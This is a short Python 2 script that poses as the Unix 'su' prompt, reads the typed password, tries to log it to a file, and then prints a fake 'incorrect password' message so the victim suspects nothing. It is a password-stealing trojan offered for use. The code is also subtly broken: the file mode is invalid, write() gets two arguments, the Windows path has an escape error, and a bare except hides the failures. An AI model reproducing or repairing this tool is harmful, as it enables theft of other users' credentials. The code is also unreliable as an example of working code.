#!/usr/bin/env python
#_*_coding:utf-8_*_
 
import os, sys, getpass, time  
current_time = time.strftime("%Y-%m-%d")  
logfile='C:\tmp\su.log'
fail_str = "su: incorrect password" 
try:  
    passwd = getpass.getpass(prompt='Password: ');  
    file=open(logfile,'b')  
    file.write(passwd, current_time)  
    file.write('\n')  
    file.close()  
except:  
    pass 
time.sleep(1)  
print fail_str 





